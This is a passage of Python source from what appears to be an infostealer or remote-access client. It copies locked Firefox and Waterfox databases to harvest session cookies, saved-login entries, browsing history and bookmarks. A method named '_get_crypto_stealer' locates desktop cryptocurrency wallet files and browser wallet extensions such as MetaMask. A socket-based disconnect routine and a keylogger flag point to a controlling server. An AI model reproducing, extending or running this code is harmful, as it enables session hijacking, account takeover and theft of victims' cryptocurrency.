                ff_data = {"passwords": [], "cookies": [], "history": [], "bookmarks": []}
                for profile_dir in os.listdir(ff_base):
                    cookies_db = os.path.join(ff_base, profile_dir, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        try:
                            tmp = _copy_locked_db(cookies_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT host, name, value, path, isSecure, isHttpOnly FROM moz_cookies LIMIT 5000")
                            for row in cur.fetchall():
                                ff_data["cookies"].append({
                                    "host": row[0], "name": row[1], "value": row[2],
                                    "path": row[3], "secure": bool(row[4]), "httponly": bool(row[5]),
                                })
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass

                    logins_db = os.path.join(ff_base, profile_dir, "logins.json")
                    if os.path.exists(logins_db):
                        try:
                            with open(logins_db, "r", encoding="utf-8") as f:
                                logins = json.load(f)
                            for login in logins.get("logins", []):
                                ff_data["passwords"].append({
                                    "url": login.get("hostname", ""),
                                    "username": login.get("encryptedUsername", ""),
                                    "password": "[encrypted - Firefox master password required]",
                                })
                        except Exception:
                            pass

                    places_db = os.path.join(ff_base, profile_dir, "places.sqlite")
                    if os.path.exists(places_db):
                        try:
                            tmp = _copy_locked_db(places_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")
                            for row in cur.fetchall():
                                ff_data["history"].append({"url": row[0], "title": row[1], "visits": row[2]})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass

                    bookmarks_json = os.path.join(ff_base, profile_dir, "places.sqlite")
                    if os.path.exists(bookmarks_json):
                        try:
                            tmp = _copy_locked_db(bookmarks_json)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 LIMIT 500")
                            for row in cur.fetchall():
                                ff_data["bookmarks"].append({"name": row[0] or "", "url": row[1] or ""})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass

                if any(ff_data.values()):
                    result["firefox"] = ff_data

            # Waterfox
            wf_base = os.path.expandvars(r"%APPDATA%\Waterfox\Profiles")
            if os.path.exists(wf_base):
                wf_data = {"cookies": [], "history": [], "bookmarks": []}
                for profile_dir in os.listdir(wf_base):
                    cookies_db = os.path.join(wf_base, profile_dir, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        try:
                            tmp = _copy_locked_db(cookies_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT host, name, value, path, isSecure, isHttpOnly FROM moz_cookies LIMIT 2000")
                            for row in cur.fetchall():
                                wf_data["cookies"].append({
                                    "host": row[0], "name": row[1], "value": row[2],
                                    "path": row[3], "secure": bool(row[4]), "httponly": bool(row[5]),
                                })
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass

                if any(wf_data.values()):
                    result["waterfox"] = wf_data

        except Exception as e:
            result["_error"] = str(e)
        return result

    def _get_crypto_stealer(self) -> dict:
        """Scan for cryptocurrency wallets: desktop wallet files + browser extension data."""
        result = {"desktop_wallets": [], "browser_extensions": []}
        try:
            # Desktop wallet file paths (Windows)
            wallet_paths = {
                "Bitcoin Core": os.path.expandvars(r"%APPDATA%\Bitcoin\wallet.dat"),
                "Electrum": os.path.expandvars(r"%APPDATA%\Electrum\wallets"),
                "Exodus": os.path.expandvars(r"%APPDATA%\Exodus\exodus.wallet"),
                "Atomic Wallet": os.path.expandvars(r"%APPDATA%\atomic"),
                "Coinomi": os.path.expandvars(r"%APPDATA%\Coinomi"),
                "Jaxx Liberty": os.path.expandvars(r"%APPDATA%\Jaxx Liberty"),
                "BRD": os.path.expandvars(r"%APPDATA%\bread"),
                "Edge Wallet": os.path.expandvars(r"%APPDATA%\Edge Wallet"),
                "Trust Wallet": os.path.expandvars(r"%APPDATA%\Trust"),
                "Wasabi": os.path.expandvars(r"%APPDATA%\WalletWasabi"),
                "Samourai": os.path.expandvars(r"%APPDATA%\Samourai"),
                "BlueWallet": os.path.expandvars(r"%APPDATA%\BlueWallet"),
            }
            for wallet_name, wpath in wallet_paths.items():
                if os.path.exists(wpath):
                    try:
                        if os.path.isfile(wpath):
                            size = os.path.getsize(wpath)
                            result["desktop_wallets"].append({
                                "name": wallet_name, "path": wpath,
                                "status": "found", "size": size,
                            })
                        elif os.path.isdir(wpath):
                            files = os.listdir(wpath)
                            result["desktop_wallets"].append({
                                "name": wallet_name, "path": wpath,
                                "status": "found", "files": files[:20],
                            })
                    except Exception:
                        pass

            # Browser extension crypto wallets
            extension_wallets = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpb",
                "Trust Wallet": "egjidjbpglichdcondbcbdnachmppkhg",
                "Coinbase Wallet": "hnfanknocfeofodojknjpchemobdlifd",
                "Exodus": "aholpfdialjgjfhmfihgbkmdkbfadlgm",
                "Brave Wallet": "odbfpeeihodbihlmhfnkagiiopncfemo",
                "Atomic Wallet": "ckkgcnceoipehddmhhapiomjilkjmpbd",
                "Math Wallet": "afbcbjpbpjadpibhhnakccjddjfhmgep",
                "TokenPocket": "mgihcnkcjlnkpobjedkoghpkojjkhhkk",
                "SafePal": "lgmpfmgnnophknojemaepahcfaagmnki",
                "BitKeep": "jpndcfaagofedabohhadlbfhaimadce",
                "1inch Wallet": "dlcobpjiigpikoogohjmbangjokihhfo",
            }
            ext_base_paths = [
                os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings"),
                os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Profile *\Local Extension Settings"),
                os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings"),
                os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings"),
            ]
            import glob as glob_mod
            for ext_name, ext_id in extension_wallets.items():
                found = False
                for base_pattern in ext_base_paths:
                    for ext_dir in glob_mod.glob(os.path.join(base_pattern, ext_id)):
                        if os.path.isdir(ext_dir):
                            files = os.listdir(ext_dir)
                            result["browser_extensions"].append({
                                "name": ext_name, "extension_id": ext_id,
                                "status": "found", "files": files[:10],
                                "path": ext_dir,
                            })
                            found = True
                            break
                    if found:
                        break
                if not found:
                    result["browser_extensions"].append({
                        "name": ext_name, "extension_id": ext_id,
                        "status": "not_found",
                    })

        except Exception as e:
            result["_error"] = str(e)
        return result

    def disconnect(self):
        self._running = False
        self._keylog_active = False
        if self._sock:
            try:
                self._sock.sendall(pack_message("DISCONNECT", {}))
                self._sock.close()
            except Exception:
                pass
